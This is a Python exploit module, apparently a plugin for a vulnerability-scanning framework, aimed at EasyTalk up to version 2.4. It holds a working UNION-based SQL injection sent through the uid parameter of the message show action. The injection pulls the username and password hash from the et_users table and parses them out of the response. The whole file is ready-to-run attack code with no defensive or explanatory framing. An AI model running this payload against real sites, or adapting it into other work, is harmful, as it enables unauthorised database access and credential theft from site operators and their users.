#!/usr/bin/env python
# -*- coding:utf-8 -*-

from lib import logger
from lib import requests

author = "Chu <root@sh3ll.me>"
scope = "EasyTalk -2.4"
description = "MessageAction.class.php 中 show 函数 uid 参数未过滤导致 SQL 注入"
reference = "http://www.wooyun.org/bugs/wooyun-2010-050338"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    },
    {
        "Name": "Cookie",
        "Current Setting": "",
        "Required": True,
        "Description": "Cookie"
    },
]


def exploit(URL, Cookie):
    logger.process("Requesting "+URL)
    url = URL + "/?m=message&a=show&uid=%27)%20union%20select%20concat(0x686" \
                "16e64736f6d65636875,user_name,0x7e7e7e,password,0x68616e647" \
                "36f6d65636875)%20from%20et_users%20limit%201,1%23"
    r = requests.get(
        url=url,
        cookies=Cookie,
        timeout=5
    )
    r.close()
    if "handsomechu" in r.text:
        logger.success("Exploitable!")
        handsomechu = r.text.split("handsomechu")[1].split("~~~")
        username, password = handsomechu
        logger.success("Username: %s" % username)
        logger.success("Hash: %s" % password)
        return "%s: %s|%s" % (URL, username, password)
